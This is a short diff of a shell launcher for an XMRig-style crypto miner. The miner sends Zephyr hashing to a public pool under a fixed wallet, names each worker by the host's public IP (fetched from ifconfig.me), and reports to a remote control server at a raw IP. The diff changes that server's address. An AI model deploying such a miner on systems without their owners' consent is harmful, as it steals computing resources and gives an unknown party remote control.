@@ -3,4 +3,4 @@ POOL=us2.zephyr.herominers.com:1123
 WALLET=ZEPHsBL4wFydCvcmNJEHc7iR7Fq6NcZtFHsSAV7GpztYDzZtyanCTShcMd7d2n96yMHhioHisWLpJWGcvaAstUYm2itMLaQKzhk.CPU_$(echo "$(curl -s ifconfig.me)" | tr . _ )
 myip=$(echo "$(curl -s ifconfig.me)" | tr . _ )
 cd "$(dirname "$0")"
-chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o $POOL -u $WALLET $@ -p x -k --donate-level=1 --cc-url=103.47.132.3:2012 --cc-access-token=kevin --cc-worker-id=${myip}
+chmod +x ./xmrigDaemon && clear && ./xmrigDaemon -a rx/0 -o $POOL -u $WALLET $@ -p x -k --donate-level=1 --cc-url=103.175.229.126 --cc-access-token=kevin --cc-worker-id=${myip}
